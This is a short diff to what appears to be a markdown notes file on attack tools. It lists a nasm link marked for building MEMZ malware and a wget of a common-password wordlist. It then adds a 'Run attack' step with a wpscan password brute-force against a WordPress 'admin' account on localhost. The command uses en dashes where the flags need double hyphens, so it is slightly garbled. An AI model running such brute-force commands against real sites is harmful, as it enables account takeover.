@@ -7,3 +7,6 @@
 [nasm ***For MEMZ***](http://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D)   
 ## WordPress
      wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/10_million_password_list_top_10000.txt
+Run attack
+
+     wpscan –url localhost –wordlist ~/10_million_password_list_top_10000.txt –user admin
